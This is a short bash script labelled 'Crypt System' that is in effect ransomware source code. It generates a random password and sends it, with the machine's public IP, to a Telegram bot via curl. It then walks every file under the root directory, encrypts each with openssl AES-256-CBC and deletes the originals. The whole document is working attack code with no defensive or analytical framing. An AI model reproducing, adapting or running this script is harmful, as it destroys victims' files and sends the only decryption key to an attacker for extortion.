#!/bin/bash

#Crypt System
#function to generate a random password
function generate_password {
    #generate a random password using openssl rand
    password=$(openssl rand -base64 16)
    #send the generated password
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="System Crypted: $public_ip %0APassword: $password"
}
#call function
generate_password
#creates a list of all files
files=$(find / -type f)
#encrypts each file using the generated password
for file in $files; do
    #create encrypted file name
    encrypted_file="$file.enc"
    #encrypt the file using openssl and the generated password
    openssl enc -aes-256-cbc -salt -in "$file" -out "$encrypted_file" -pass pass:"$password"
    #eemoves the original file if encryption was successful
    if [ $? -eq 0 ]; then
        rm "$file"
    fi
done
